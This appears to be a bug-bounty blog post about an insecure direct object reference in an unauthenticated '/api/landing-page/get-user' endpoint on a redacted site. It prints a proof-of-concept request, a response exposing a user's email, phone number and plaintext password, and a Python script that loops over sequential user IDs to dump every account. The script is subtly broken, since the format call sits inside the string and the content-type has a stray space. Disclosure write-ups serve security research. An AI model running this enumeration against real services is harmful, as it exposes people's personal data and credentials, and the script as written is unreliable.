---
title: "The story of how I was able to leak all user data"
tags:
- Bug Bounty
- Python
- Hacking
---

# Overview

Missing authentication leads to user data leakage, That's the sentence that describes the problem in this article. Authentication is basically the most important part of security when building an application because it keeps unauthenticated people from accessing anything sensitive or trying to become a privileged user.

## How do I catch a bug?
I performed basic reconnaissance techniques on the target and performed activities like a normal user. The site didn't have many features and forms, I tested a few things messing with business logic, breaking authentication and session validation all seemed safe until when I checked every request in the proxy history using Burp Suite which made it easy to reproduce the issue. I found a **POST** api request to the path **/api/landing-page/get-user** 

# Proof of Concept

### Request

```
POST /api/landing-page/get-user HTTP/1.1
Host: redacted.com
Origin: https://redacted.com
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

guid=&code=0&data={"user_id":"<ID_USER_HERE>"}
```

### Response
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
pragma: no-cache
cache-control: no-cache, no-store
content-length: 425
x-frame-options: SAMEORIGIN

{
  "code": "0",
  "info": "Successfully Get User Results",
  "data": {
    "id": 1,
    "nama": "My User",
    "email": "myuser@gmail.com",
    "msisdn": "121212122",
    "institusi": "",
    "password": "myuserpassword",
    "create_dtm": "2021-07-07T02:13:13.000Z",
    "nonce": "6603",
    "status_otp": 1,
    "status_otp_info": "{\"code\":\"0\",\"info\":\"OTP code sent successfully.\",\"data\":[]}",
    "status_otp_count": 0,
    "last_login": "2023-01-19T02:00:35.000Z"
  }
}
```

# Leaking all user data
By using any registered user id can leak registered user data this is a kind of vulnerability Insecure direct object reference (IDOR) - <cite>is a type of access control vulnerability that arises when applications use user-supplied input to access objects directly.</cite> I knew that the user ids used were not random but sequential so I wrote python code to leak every registered user's data on the site.

### Python code

```
import requests
import os

for i in range(10):
    r = requests.post("https://redacted.com/api/landing-page/get-user", data='guid=&code=0&data={"user_id":"{}".format(i)} ', headers={'User-Agent': f'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/{i}', 'Content-Type': 'application/x-www-form -urlencoded'})
    if len(r.text) > 350:
        print(r.text + os.linesep)
    else:
        pass
```

Uses the **requests** library to make a request to the specified URL along with the data in the body

```
r = requests.post("https://redacted.com/api/landing-page/get-user", data='guid=&code=0&data={"user_id":"{}".format(i)} ', headers={'User-Agent': f'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/{i}', 'Content-Type': 'application/x-www-form -urlencoded'})
```

Performs filtering on the response data to check if there is valid user data otherwise it will forward the next request.

```
if len(r.text) > 350:
        print(r.text + os.linesep)
    else:
        pass
```

# $$$
![image](https://raw.githubusercontent.com/thd3r/thd3r.github.io/master/assets/images/writeup/2023-07-04-IDOR_1/Screenshot_2023-07-04_01-04-06.png)

# Conclusion
Check the incoming traffic including some API requests that you may have missed. Then try to create a good report so that the security team can reproduce the findings as well as create an exploit script that helps to show and exacerbate the impact. This can also be a plus while practicing coding.

That's it, Thanks for reading - <a href="https://x.com/thd3r">@thd3r</a>